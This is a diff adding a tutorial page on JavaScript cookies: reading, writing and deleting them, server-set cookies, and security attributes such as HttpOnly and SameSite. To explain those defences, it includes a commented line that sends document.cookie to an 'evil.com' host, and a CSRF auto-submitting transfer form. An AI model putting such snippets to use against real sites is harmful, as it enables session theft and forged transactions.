@@ -1,0 +1,1033 @@
+---
+title: "Cookies: Server-Accessible Browser Storage in JavaScript"
+sidebarTitle: "Cookies"
+description: "Learn JavaScript cookies. Understand how to read, write, and delete cookies, cookie attributes like HttpOnly and SameSite, and security best practices."
+---
+
+Why do websites "remember" you're logged in, even after closing your browser? How does that shopping cart persist across tabs? Why can some data survive for weeks while other data vanishes when you close a tab?
+
+```javascript
+// Set a cookie that remembers the user for 7 days
+document.cookie = "username=Alice; max-age=604800; path=/; secure; samesite=strict"
+
+// Read all cookies (returns a single string)
+console.log(document.cookie)  // "username=Alice; theme=dark; lang=en"
+
+// The server also sees these cookies with every request!
+// Cookie: username=Alice; theme=dark; lang=en
+```
+
+The answer is **cookies**. They're the original browser storage mechanism, and unlike localStorage, cookies are automatically sent to the server with every HTTP request. This makes them essential for authentication, sessions, and any data the server needs to know about.
+
+<Info>
+**What you'll learn in this guide:**
+- What cookies are and how they differ from other storage
+- Reading, writing, and deleting cookies with JavaScript
+- Server-side cookies with the [`Set-Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie) header
+- Cookie attributes: `Expires`, `Max-Age`, `Path`, `Domain`
+- Security attributes: `Secure`, `HttpOnly`, `SameSite`
+- How to protect against XSS and CSRF attacks
+- First-party vs third-party cookies and privacy
+- The future of cookies: third-party deprecation and CHIPS
+- When to use cookies vs localStorage vs sessionStorage
+</Info>
+
+<Warning>
+**Prerequisites:** This guide builds on your understanding of [HTTP and Fetch](/concepts/http-fetch) and [localStorage/sessionStorage](/beyond/concepts/localstorage-sessionstorage). Understanding HTTP requests and responses will help you grasp how cookies travel between browser and server.
+</Warning>
+
+---
+
+## What are Cookies in JavaScript?
+
+**[Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies)** are small pieces of data (up to ~4KB) that websites store in the browser and automatically send to the server with every HTTP request. Unlike localStorage which stays in the browser, cookies bridge the gap between client and server, enabling features like user authentication, session management, and personalization that require the server to "remember" who you are.
+
+<Note>
+Cookies were invented by Lou Montulli at Netscape in 1994 to solve the problem of implementing a shopping cart. HTTP is stateless, meaning each request is independent. Cookies gave the web "memory."
+</Note>
+
+---
+
+## The Visitor Badge Analogy
+
+Think of cookies like a **visitor badge at an office building**:
+
+1. **First visit**: You arrive and sign in at reception. They give you a badge with your name and access level.
+2. **Moving around**: You wear the badge everywhere. Security guards (servers) can see it and know who you are without asking again.
+3. **Badge expiration**: Some badges expire at the end of the day (session cookies). Others are valid for a year (persistent cookies).
+4. **Restricted areas**: Some badges only work on certain floors (the `path` attribute).
+5. **Security features**: Some badges have photos that can't be photocopied (the `HttpOnly` attribute prevents JavaScript access).
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                     HOW COOKIES TRAVEL                                       │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   STEP 1: Browser requests a page                                            │
+│   ─────────────────────────────────                                          │
+│                                                                              │
+│   Browser ──────────────────────────────────────────────────────► Server     │
+│            GET /login HTTP/1.1                                               │
+│            Host: example.com                                                 │
+│                                                                              │
+│   STEP 2: Server responds with Set-Cookie                                    │
+│   ───────────────────────────────────────                                    │
+│                                                                              │
+│   Browser ◄────────────────────────────────────────────────────── Server     │
+│            HTTP/1.1 200 OK                                                   │
+│            Set-Cookie: sessionId=abc123; HttpOnly; Secure                    │
+│            Set-Cookie: theme=dark; Max-Age=31536000                          │
+│                                                                              │
+│   STEP 3: Browser stores cookies and sends them with EVERY request           │
+│   ────────────────────────────────────────────────────────────────           │
+│                                                                              │
+│   Browser ──────────────────────────────────────────────────────► Server     │
+│            GET /dashboard HTTP/1.1                                           │
+│            Host: example.com                                                 │
+│            Cookie: sessionId=abc123; theme=dark                              │
+│                                                                              │
+│   The server now knows who you are without you logging in again!             │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Setting Cookies with JavaScript
+
+The [`document.cookie`](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie) property is how you read and write cookies in JavaScript. But it has a quirky API that surprises most developers.
+
+### Basic Cookie Syntax
+
+```javascript
+// Set a simple cookie
+document.cookie = "username=Alice"
+
+// Set a cookie with attributes
+document.cookie = "username=Alice; max-age=86400; path=/; secure"
+
+// Important: Each assignment sets ONE cookie, not all cookies!
+document.cookie = "theme=dark"      // Adds another cookie
+document.cookie = "lang=en"         // Adds yet another cookie
+```
+
+### The Quirky Nature of document.cookie
+
+Here's what surprises most developers: `document.cookie` is NOT a regular property. It's an [accessor property](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty) with special getter and setter behavior:
+
+```javascript
+// Setting a cookie doesn't replace all cookies - it adds or updates ONE
+document.cookie = "a=1"
+document.cookie = "b=2"
+document.cookie = "c=3"
+
+// Reading returns ALL cookies as a single string
+console.log(document.cookie)  // "a=1; b=2; c=3"
+
+// You can't get a single cookie directly - you get ALL of them
+// There's no document.cookie.a or document.cookie['a']
+```
+
+### Encoding Special Characters
+
+Cookie values can't contain semicolons, commas, or spaces without encoding:
+
+```javascript
+// Bad: This will break!
+document.cookie = "message=Hello, World!"  // Comma and space cause issues
+
+// Good: Encode the value
+document.cookie = `message=${encodeURIComponent("Hello, World!")}`
+// Results in: message=Hello%2C%20World!
+
+// When reading, decode it back
+const value = decodeURIComponent(getCookie("message"))  // "Hello, World!"
+```
+
+---
+
+## Reading Cookies
+
+Reading cookies requires parsing the `document.cookie` string. Here are practical helper functions:
+
+```javascript
+// Get a specific cookie by name
+function getCookie(name) {
+  const cookies = document.cookie.split("; ")
+  for (const cookie of cookies) {
+    const [cookieName, cookieValue] = cookie.split("=")
+    if (cookieName === name) {
+      return decodeURIComponent(cookieValue)
+    }
+  }
+  return null
+}
+
+// Usage
+const username = getCookie("username")  // "Alice" or null
+```
+
+### A More Robust Parser
+
+```javascript
+// Parse all cookies into an object
+function parseCookies() {
+  return document.cookie
+    .split("; ")
+    .filter(Boolean)  // Remove empty strings
+    .reduce((cookies, cookie) => {
+      const [name, ...valueParts] = cookie.split("=")
+      // Handle values that contain '=' signs
+      const value = valueParts.join("=")
+      cookies[name] = decodeURIComponent(value)
+      return cookies
+    }, {})
+}
+
+// Usage
+const cookies = parseCookies()
+console.log(cookies.username)  // "Alice"
+console.log(cookies.theme)     // "dark"
+```
+
+### Check If a Cookie Exists
+
+```javascript
+function hasCookie(name) {
+  return document.cookie
+    .split("; ")
+    .some(cookie => cookie.startsWith(`${name}=`))
+}
+
+// Usage
+if (hasCookie("sessionId")) {
+  console.log("User is logged in")
+}
+```
+
+---
+
+## Writing Cookies: A Complete Helper
+
+Here's a comprehensive cookie-setting function:
+
+```javascript
+function setCookie(name, value, options = {}) {
+  // Default options
+  const defaults = {
+    path: "/",           // Available across the entire site
+    secure: true,        // HTTPS only (recommended)
+    sameSite: "lax"      // CSRF protection
+  }
+  
+  const settings = { ...defaults, ...options }
+  
+  // Start building the cookie string
+  let cookieString = `${encodeURIComponent(name)}=${encodeURIComponent(value)}`
+  
+  // Add expiration
+  if (settings.maxAge !== undefined) {
+    cookieString += `; max-age=${settings.maxAge}`
+  } else if (settings.expires instanceof Date) {
+    cookieString += `; expires=${settings.expires.toUTCString()}`
+  }
+  
+  // Add path
+  if (settings.path) {
+    cookieString += `; path=${settings.path}`
+  }
+  
+  // Add domain (for sharing across subdomains)
+  if (settings.domain) {
+    cookieString += `; domain=${settings.domain}`
+  }
+  
+  // Add security flags
+  if (settings.secure) {
+    cookieString += "; secure"
+  }
+  
+  if (settings.sameSite) {
+    cookieString += `; samesite=${settings.sameSite}`
+  }
+  
+  document.cookie = cookieString
+}
+
+// Usage examples
+setCookie("username", "Alice", { maxAge: 86400 })           // 1 day
+setCookie("preferences", JSON.stringify({ theme: "dark" })) // Store object
+setCookie("temp", "value", { maxAge: 0 })                   // Delete immediately
+```
+
+---
+
+## Deleting Cookies
+
+There's no direct "delete" method for cookies. Instead, you set the cookie with an expiration in the past or `max-age=0`:
+
+```javascript
+function deleteCookie(name, options = {}) {
+  // Must use the same path and domain as when the cookie was set!
+  setCookie(name, "", {
+    ...options,
+    maxAge: 0  // Expire immediately
+  })
+}
+
+// Alternative: Set expiration to the past
+document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/"
+
+// Usage
+deleteCookie("username")
+deleteCookie("sessionId", { path: "/app" })  // Must match original path!
+```
+
+<Warning>
+**Critical:** When deleting a cookie, you MUST use the same `path` and `domain` attributes as when it was set. If a cookie was set with `path=/app`, deleting it with `path=/` won't work!
+</Warning>
+
+---
+
+## Server-Side Cookies with Set-Cookie
+
+While JavaScript can set cookies, servers have more control using the [`Set-Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie) HTTP header:
+
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html
+Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
+Set-Cookie: csrfToken=xyz789; Secure; SameSite=Strict; Max-Age=3600
+```
+
+### Node.js/Express Example
+
+```javascript
+const express = require("express")
+const app = express()
+
+app.post("/login", (req, res) => {
+  // After validating credentials...
+  const sessionId = generateSecureSessionId()
+  
+  // Set a secure session cookie
+  res.cookie("sessionId", sessionId, {
+    httpOnly: true,     // Can't be accessed by JavaScript!
+    secure: true,       // HTTPS only
+    sameSite: "strict", // CSRF protection
+    maxAge: 3600000     // 1 hour in milliseconds
+  })
+  
+  res.json({ success: true })
+})
+
+app.post("/logout", (req, res) => {
+  // Clear the session cookie
+  res.clearCookie("sessionId", {
+    httpOnly: true,
+    secure: true,
+    sameSite: "strict"
+  })
+  
+  res.json({ success: true })
+})
+```
+
+### Why Server-Set Cookies?
+
+Servers can set cookies that JavaScript **cannot read or modify**:
+
+| Setter | Can Use HttpOnly? | JavaScript Access | Best For |
+|--------|------------------|-------------------|----------|
+| Server (`Set-Cookie`) | Yes | Blocked with HttpOnly | Session tokens, auth |
+| JavaScript (`document.cookie`) | No | Always accessible | UI preferences, non-sensitive data |
+
+---
+
+## Cookie Attributes Explained
+
+### Expires and Max-Age: Controlling Lifetime
+
+<Tabs>
+  <Tab title="max-age (Recommended)">
+    ```javascript
+    // Expires in 1 hour (3600 seconds)
+    document.cookie = "token=abc; max-age=3600"
+    
+    // Expires in 7 days
+    document.cookie = "remember=true; max-age=604800"
+    
+    // Delete immediately (max-age=0 or negative)
+    document.cookie = "token=; max-age=0"
+    ```
+    
+    **Why prefer `max-age`?** It's relative to now, not dependent on clock synchronization between client and server.
+  </Tab>
+  <Tab title="expires (Legacy)">
+    ```javascript
+    // Expires on a specific date (must be UTC string)
+    const expDate = new Date()
+    expDate.setTime(expDate.getTime() + 7 * 24 * 60 * 60 * 1000)  // 7 days
+    
+    document.cookie = `remember=true; expires=${expDate.toUTCString()}`
+    // expires=Sun, 12 Jan 2025 10:30:00 GMT
+    
+    // Delete by setting past date
+    document.cookie = "token=; expires=Thu, 01 Jan 1970 00:00:00 GMT"
+    ```
+    
+    **Caution:** `expires` depends on the client's clock, which may be wrong.
+  </Tab>
+  <Tab title="Session Cookie">
+    ```javascript
+    // No expires or max-age = session cookie
+    document.cookie = "tempData=xyz"
+    
+    // This cookie is deleted when the browser closes
+    // (Though "session restore" features may keep it alive!)
+    ```
+  </Tab>
+</Tabs>
+
+### Path: URL Restriction
+
+The `path` attribute restricts which URLs the cookie is sent to:
+
+```javascript
+// Only sent to /app and below (/app/dashboard, /app/settings)
+document.cookie = "appToken=abc; path=/app"
+
+// Only sent to /admin and below
+document.cookie = "adminToken=xyz; path=/admin"
+
+// Sent everywhere on the site (default recommendation)
+document.cookie = "theme=dark; path=/"
+```
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                     PATH ATTRIBUTE BEHAVIOR                                  │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   Cookie: token=abc; path=/app                                               │
+│                                                                              │
+│   /              ✗ Cookie NOT sent                                           │
+│   /about         ✗ Cookie NOT sent                                           │
+│   /app           ✓ Cookie sent                                               │
+│   /app/          ✓ Cookie sent                                               │
+│   /app/dashboard ✓ Cookie sent                                               │
+│   /app/settings  ✓ Cookie sent                                               │
+│   /application   ✗ Cookie NOT sent (not a subpath!)                          │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+<Warning>
+**Security Note:** The `path` attribute is NOT a security feature! A malicious script on `/public` can still read cookies set for `/admin` by creating a hidden iframe. Use `HttpOnly` and proper authentication instead.
+</Warning>
+
+### Domain: Subdomain Sharing
+
+The `domain` attribute controls which domains receive the cookie:
+
+```javascript
+// Default: Only sent to exact domain that set it
+document.cookie = "token=abc"  // Only sent to www.example.com
+
+// Explicitly share with all subdomains
+document.cookie = "token=abc; domain=example.com"
+// Sent to: example.com, www.example.com, api.example.com, etc.
+```
+
+**Rules:**
+- You can only set `domain` to your current domain or a parent domain
+- You cannot set cookies for unrelated domains (security restriction)
+- Leading dots (`.example.com`) are ignored in modern browsers
+
+---
+
+## Security Attributes: Protecting Your Cookies
+
+### Secure: HTTPS Only
+
+```javascript
+// Only sent over HTTPS connections
+document.cookie = "sessionId=abc; secure"
+
+// Without 'secure', cookies can be intercepted on HTTP!
+```
+
+<Tip>
+**Always use `secure` for any sensitive cookie.** Without it, cookies can be intercepted by attackers on public WiFi (man-in-the-middle attacks).
+</Tip>
+
+### HttpOnly: Block JavaScript Access
+
+The `HttpOnly` attribute is critical for security, but JavaScript cannot set it:
+
+```http
+Set-Cookie: sessionId=abc123; HttpOnly; Secure
+```
+
+```javascript
+// This cookie is invisible to JavaScript!
+console.log(document.cookie)  // sessionId won't appear
+
+// Attackers can't steal it via XSS:
+// new Image().src = "https://evil.com/steal?cookie=" + document.cookie
+// The sessionId won't be included!
+```
+
+**Why HttpOnly matters:**
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                     XSS ATTACK WITHOUT HttpOnly                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   1. Attacker injects malicious script into your site                        │
+│   2. Script runs: new Image().src = "evil.com?c=" + document.cookie          │
+│   3. Attacker receives your session cookie!                                  │
+│   4. Attacker impersonates you and accesses your account                     │
+│                                                                              │
+│   WITH HttpOnly:                                                             │
+│   1. Attacker injects malicious script                                       │
+│   2. Script runs: document.cookie doesn't include HttpOnly cookies!          │
+│   3. Attacker gets nothing sensitive                                         │
+│   4. Your session is protected                                               │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### SameSite: CSRF Protection
+
+The [`SameSite`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value) attribute controls when cookies are sent with cross-site requests:
+
+<Tabs>
+  <Tab title="Strict">
+    ```javascript
+    document.cookie = "sessionId=abc; samesite=strict"
+    ```
+    
+    **Behavior:** Cookie is NEVER sent with cross-site requests.
+    
+    **Use case:** High-security cookies (banking, account management).
+    
+    **Downside:** If a user clicks a link from their email to your site, they won't be logged in on that first request.
+  </Tab>
+  <Tab title="Lax (Default)">
+    ```javascript
+    document.cookie = "sessionId=abc; samesite=lax"
+    ```
+    
+    **Behavior:** Cookie is sent with top-level navigations (clicking links) but NOT with cross-site POST requests, images, or iframes.
+    
+    **Use case:** General authentication cookies. Good balance of security and usability.
+    
+    **Note:** This is the default in modern browsers if `SameSite` is not specified.
+  </Tab>
+  <Tab title="None">
+    ```javascript
+    // Must include Secure when using SameSite=None!
+    document.cookie = "widgetId=abc; samesite=none; secure"
+    ```
+    
+    **Behavior:** Cookie is sent with ALL requests, including cross-site.
+    
+    **Use case:** Third-party cookies, embedded widgets, cross-site services.
+    
+    **Requirement:** Must also have `Secure` attribute.
+  </Tab>
+</Tabs>
+
+**CSRF Attack Prevention:**
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                     CSRF ATTACK SCENARIO                                     │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   1. You're logged into bank.com (session cookie stored)                     │
+│   2. You visit evil.com which contains:                                      │
+│      <form action="https://bank.com/transfer" method="POST">                 │
+│        <input name="to" value="attacker">                                    │
+│        <input name="amount" value="10000">                                   │
+│      </form>                                                                 │
+│      <script>document.forms[0].submit()</script>                            │
+│   3. WITHOUT SameSite: Your session cookie is sent, transfer succeeds!       │
+│   4. WITH SameSite=Strict or Lax: Cookie NOT sent, attack fails!            │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### Cookie Prefixes: Extra Security
+
+Modern browsers support special cookie name prefixes that enforce security requirements:
+
+```http
+# __Secure- prefix: MUST have Secure attribute
+Set-Cookie: __Secure-sessionId=abc; Secure; Path=/
+
+# __Host- prefix: MUST have Secure, Path=/, and NO Domain
+Set-Cookie: __Host-sessionId=abc; Secure; Path=/
+```
+
+The `__Host-` prefix provides the strongest guarantees:
+- Can only be set from a secure (HTTPS) page
+- Must have `Secure` attribute
+- Must have `Path=/`
+- Cannot have a `Domain` attribute (bound to exact host)
+
+---
+
+## First-Party vs Third-Party Cookies
+
+### First-Party Cookies
+
+Cookies set by the website you're visiting:
+
+```javascript
+// On example.com
+document.cookie = "theme=dark"  // First-party cookie
+```
+
+### Third-Party Cookies
+
+Cookies set by a different domain than the one you're visiting:
+
+```html
+<!-- On example.com, this image loads from ads.tracker.com -->
+<img src="https://ads.tracker.com/pixel.gif">
+
+<!-- ads.tracker.com can set a cookie that tracks you across sites -->
+```
+
+**How third-party tracking works:**
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                     THIRD-PARTY COOKIE TRACKING                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   You visit site-a.com                                                       │
+│   ├── Page loads ads.tracker.com/pixel.gif                                   │
+│   └── tracker.com sets cookie: userId=12345                                  │
+│                                                                              │
+│   Later, you visit site-b.com                                                │
+│   ├── Page loads ads.tracker.com/pixel.gif                                   │
+│   └── tracker.com receives cookie: userId=12345                              │
+│       "Ah, this is the same person who visited site-a.com!"                  │
+│                                                                              │
+│   tracker.com now knows your browsing history across multiple sites          │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Third-Party Cookie Deprecation
+
+Major browsers are phasing out third-party cookies for privacy:
+
+| Browser | Status |
+|---------|--------|
+| Safari | Blocked by default since 2020 |
+| Firefox | Blocked by default in Enhanced Tracking Protection |
+| Chrome | Rolling out restrictions in 2024-2025 |
+
+### CHIPS: Partitioned Cookies
+
+For legitimate cross-site use cases (embedded widgets, federated login), browsers now support **Cookies Having Independent Partitioned State (CHIPS)**:
+
+```http
+Set-Cookie: __Host-widgetSession=abc; Secure; Path=/; Partitioned; SameSite=None
+```
+
+With `Partitioned`, the cookie is isolated per top-level site:
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                     PARTITIONED COOKIES (CHIPS)                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   widget.com embedded in site-a.com                                          │
+│   └── Cookie: widgetSession=abc (partitioned to site-a.com)                  │
+│                                                                              │
+│   widget.com embedded in site-b.com                                          │
+│   └── Cookie: widgetSession=xyz (partitioned to site-b.com)                  │
+│                                                                              │
+│   These are DIFFERENT cookies! widget.com can't track across sites.          │
+│   But it CAN maintain state within each embedding site.                      │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Cookies vs Web Storage: When to Use What
+
+| Feature | Cookies | localStorage | sessionStorage |
+|---------|---------|--------------|----------------|
+| **Size limit** | ~4KB per cookie | ~5-10MB | ~5-10MB |
+| **Sent to server** | Yes, automatically | No | No |
+| **Expiration** | Configurable | Never | Tab close |
+| **JavaScript access** | Yes (unless HttpOnly) | Yes | Yes |
+| **Survives browser close** | If persistent | Yes | No |
+| **Shared across tabs** | Yes | Yes | No |
+| **Best for** | Auth, server state | Large data, preferences | Temporary state |
+
+### Decision Guide
+
+<Steps>
+  <Step title="Does the server need this data?">
+    **Yes** → Use cookies (they're sent automatically with requests)
+    
+    **No** → Consider Web Storage (doesn't add overhead to requests)
+  </Step>
+  
+  <Step title="Is it sensitive (session tokens, auth)?">
+    **Yes** → Use server-set cookies with `HttpOnly`, `Secure`, `SameSite`
+    
+    **No** → JavaScript-set cookies or Web Storage are fine
+  </Step>
+  
+  <Step title="How much data?">
+    **> 4KB** → Use localStorage or sessionStorage
+    
+    **< 4KB** → Either works
+  </Step>
+  
+  <Step title="Should it persist across tabs?">
+    **No, only this tab** → Use sessionStorage
+    
+    **Yes** → Use cookies or localStorage
+  </Step>
+</Steps>
+
+---
+
+## Common Mistakes
+
+<AccordionGroup>
+  <Accordion title="1. Forgetting to encode values">
+    ```javascript
+    // Bad: Special characters break the cookie
+    document.cookie = "query=search term with spaces"
+    
+    // Good: Encode the value
+    document.cookie = `query=${encodeURIComponent("search term with spaces")}`
+    ```
+  </Accordion>
+  
+  <Accordion title="2. Wrong path when deleting">
+    ```javascript
+    // Cookie was set with:
+    document.cookie = "token=abc; path=/app"
+    
+    // This WON'T delete it:
+    document.cookie = "token=; max-age=0"  // Wrong! Default path is current page
+    
+    // This WILL delete it:
+    document.cookie = "token=; max-age=0; path=/app"  // Same path!
+    ```
+  </Accordion>
+  
+  <Accordion title="3. Storing sensitive data without HttpOnly">
+    ```javascript
+    // Dangerous: JavaScript can read this (XSS vulnerable)
+    document.cookie = "sessionToken=secret123"
+    
+    // Better: Set from server with HttpOnly
+    // Set-Cookie: sessionToken=secret123; HttpOnly; Secure
+    ```
+  </Accordion>
+  
+  <Accordion title="4. Missing SameSite on sensitive cookies">
+    ```javascript
+    // Vulnerable to CSRF attacks
+    document.cookie = "authToken=abc; secure"
+    
+    // Protected against CSRF
+    document.cookie = "authToken=abc; secure; samesite=strict"
+    ```
+  </Accordion>
+  
+  <Accordion title="5. Exceeding size limits">
+    ```javascript
+    // Cookies have ~4KB limit. This might fail silently:
+    const hugeData = JSON.stringify(largeObject)  // 10KB
+    document.cookie = `data=${hugeData}`  // Silently truncated or rejected!
+    
+    // For large data, use localStorage instead
+    localStorage.setItem("data", hugeData)
+    ```
+  </Accordion>
+  
+  <Accordion title="6. Not considering cookie overhead">
+    ```javascript
+    // Every cookie is sent with EVERY request to that domain!
+    // 20 cookies × 100 bytes = 2KB extra per request
+    
+    // For data that doesn't need to go to the server:
+    localStorage.setItem("uiState", JSON.stringify(state))  // Not sent!
+    ```
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Best Practices
+
+<AccordionGroup>
+  <Accordion title="1. Always use Secure for sensitive cookies">
+    ```javascript
+    // Good: Only sent over HTTPS
+    document.cookie = "sessionId=abc; secure; samesite=strict"
+    
+    // Server-side (Express):
+    res.cookie("sessionId", token, { secure: true })
+    ```
+    
+    This prevents cookies from being intercepted on insecure networks.
+  </Accordion>
+  
+  <Accordion title="2. Use HttpOnly for session cookies">
+    ```http
+    Set-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Strict
+    ```
+    
+    JavaScript cannot read HttpOnly cookies, protecting them from XSS attacks.
+  </Accordion>
+  
+  <Accordion title="3. Set appropriate SameSite values">
+    ```javascript
+    // For session/auth cookies: Strict or Lax
+    document.cookie = "auth=token; samesite=strict; secure"
+    
+    // For cross-site widgets: None (with Secure)
+    document.cookie = "widget=data; samesite=none; secure"
+    ```
+  </Accordion>
+  
+  <Accordion title="4. Minimize cookie data">
+    ```javascript
+    // Bad: Storing lots of data in cookies
+    document.cookie = `userData=${JSON.stringify(entireUserProfile)}`
+    
+    // Good: Store only an identifier, keep data server-side
+    document.cookie = "userId=12345; secure; samesite=strict"
+    // Server looks up full profile using userId
+    ```
+  </Accordion>
+  
+  <Accordion title="5. Set explicit expiration">
+    ```javascript
+    // Bad: Session cookie (unclear lifetime)
+    document.cookie = "preference=dark"
+    
+    // Good: Explicit lifetime
+    document.cookie = "preference=dark; max-age=31536000"  // 1 year
+    ```
+  </Accordion>
+  
+  <Accordion title="6. Use cookie prefixes for extra security">
+    ```http
+    # Strongest security guarantees
+    Set-Cookie: __Host-sessionId=abc; Secure; Path=/
+    
+    # Good security
+    Set-Cookie: __Secure-token=xyz; Secure; Path=/
+    ```
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Key Takeaways
+
+<Info>
+**The key things to remember about Cookies:**
+
+1. **Cookies are sent to the server** — Unlike localStorage, cookies automatically travel with every HTTP request to the same domain
+
+2. **~4KB limit per cookie** — For larger data, use localStorage or sessionStorage
+
+3. **Use `HttpOnly` for sensitive cookies** — Server-set cookies with HttpOnly can't be stolen via XSS attacks
+
+4. **Always use `Secure` for sensitive data** — Ensures cookies only travel over HTTPS
+
+5. **Use `SameSite` to prevent CSRF** — `Strict` or `Lax` block cross-site request forgery attacks
+
+6. **Path and domain must match for deletion** — Deleting a cookie requires the same path/domain as when it was set
+
+7. **Third-party cookies are being phased out** — Use partitioned cookies (CHIPS) for legitimate cross-site use cases
+
+8. **`document.cookie` is quirky** — Setting adds/updates one cookie; reading returns all cookies as a string
+
+9. **Encode special characters** — Use `encodeURIComponent()` for values with spaces, semicolons, or commas
+
+10. **Choose the right storage** — Cookies for server communication, localStorage for persistence, sessionStorage for temporary state
+</Info>
+
+---
+
+## Test Your Knowledge
+
+<AccordionGroup>
+  <Accordion title="Question 1: What's the difference between session and persistent cookies?">
+    **Session cookies** have no `Expires` or `Max-Age` attribute and are deleted when the browser closes.
+    
+    **Persistent cookies** have an explicit expiration and survive browser restarts.
+    
+    ```javascript
+    // Session cookie (deleted on browser close)
+    document.cookie = "tempId=abc"
+    
+    // Persistent cookie (lasts 7 days)
+    document.cookie = "remember=true; max-age=604800"
+    ```
+    
+    Note: Some browsers' "session restore" feature can resurrect session cookies!
+  </Accordion>
+  
+  <Accordion title="Question 2: Why can't JavaScript read HttpOnly cookies?">
+    `HttpOnly` is a security feature that prevents JavaScript from accessing the cookie via `document.cookie` or other APIs.
+    
+    This protects against XSS (Cross-Site Scripting) attacks. If an attacker injects malicious JavaScript into your page, they can't steal session cookies that have `HttpOnly` set.
+    
+    ```javascript
+    // If server set: Set-Cookie: session=abc; HttpOnly
+    console.log(document.cookie)  // "session=abc" will NOT appear!
+    ```
+    
+    The cookie still works—it's sent with requests—JavaScript just can't read it.
+  </Accordion>
+  
+  <Accordion title="Question 3: What does SameSite=Strict prevent?">
+    `SameSite=Strict` prevents the cookie from being sent with ANY cross-site request, including:
+    
+    - Clicking a link from another site to your site
+    - Form submissions from other sites
+    - Images, iframes, or scripts loading from other sites
+    
+    This provides strong CSRF protection but can affect usability—users clicking links from emails or other sites won't be logged in on the first request.
+    
+    `SameSite=Lax` is often a better balance—it allows cookies on top-level navigation links but blocks them on POST requests and embedded resources.
+  </Accordion>
+  
+  <Accordion title="Question 4: How do you delete a cookie?">
+    Set the same cookie with `max-age=0` or an `expires` date in the past:
+    
+    ```javascript
+    // Method 1: max-age=0
+    document.cookie = "username=; max-age=0; path=/"
+    
+    // Method 2: expires in the past
+    document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/"
+    ```
+    
+    **Critical:** You must use the same `path` and `domain` attributes as when the cookie was set!
+  </Accordion>
+  
+  <Accordion title="Question 5: When should you use cookies vs localStorage?">
+    **Use cookies when:**
+    - The server needs the data (authentication, session tokens)
+    - You need to set `HttpOnly` for security
+    - Data is small (< 4KB)
+    
+    **Use localStorage when:**
+    - Data is client-side only (UI preferences)
+    - Data is large (> 4KB)
+    - You want to avoid adding overhead to HTTP requests
+    
+    **Use sessionStorage when:**
+    - Data should only last for the current tab
+    - Data shouldn't be shared across tabs
+  </Accordion>
+  
+  <Accordion title="Question 6: What are cookie prefixes and why use them?">
+    Cookie prefixes are special naming conventions that browsers enforce:
+    
+    - **`__Secure-`**: Cookie MUST have the `Secure` attribute
+    - **`__Host-`**: Cookie MUST have `Secure`, `Path=/`, and NO `Domain`
+    
+    ```http
+    Set-Cookie: __Host-sessionId=abc; Secure; Path=/
+    ```
+    
+    They provide defense-in-depth—even if there's a bug in your code, the browser enforces these security requirements. `__Host-` is the most restrictive, ensuring the cookie can only be set by and sent to the exact host.
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Related Concepts
+
+<CardGroup cols={2}>
+  <Card title="localStorage and sessionStorage" icon="database" href="/beyond/concepts/localstorage-sessionstorage">
+    Browser storage APIs for larger data that doesn't need to go to the server
+  </Card>
+  <Card title="HTTP and Fetch" icon="globe" href="/concepts/http-fetch">
+    Understanding HTTP requests and how cookies travel with them
+  </Card>
+  <Card title="IndexedDB" icon="database" href="/beyond/concepts/indexeddb">
+    Client-side database for complex data storage beyond cookies and localStorage
+  </Card>
+  <Card title="Error Handling" icon="triangle-exclamation" href="/concepts/error-handling">
+    Handling errors when cookies fail or are blocked
+  </Card>
+</CardGroup>
+
+---
+
+## Reference
+
+<CardGroup cols={2}>
+  <Card title="Using HTTP Cookies — MDN" icon="book" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies">
+    Comprehensive guide covering cookies from both server and browser perspectives. The authoritative resource for understanding cookie mechanics.
+  </Card>
+  <Card title="Document.cookie — MDN" icon="book" href="https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie">
+    JavaScript API reference for reading and writing cookies. Includes security considerations and browser compatibility.
+  </Card>
+  <Card title="Set-Cookie Header — MDN" icon="book" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie">
+    Complete reference for the Set-Cookie HTTP header and all its attributes. Essential for server-side cookie implementation.
+  </Card>
+  <Card title="Third-party Cookies — MDN" icon="book" href="https://developer.mozilla.org/en-US/docs/Web/Privacy/Guides/Third-party_cookies">
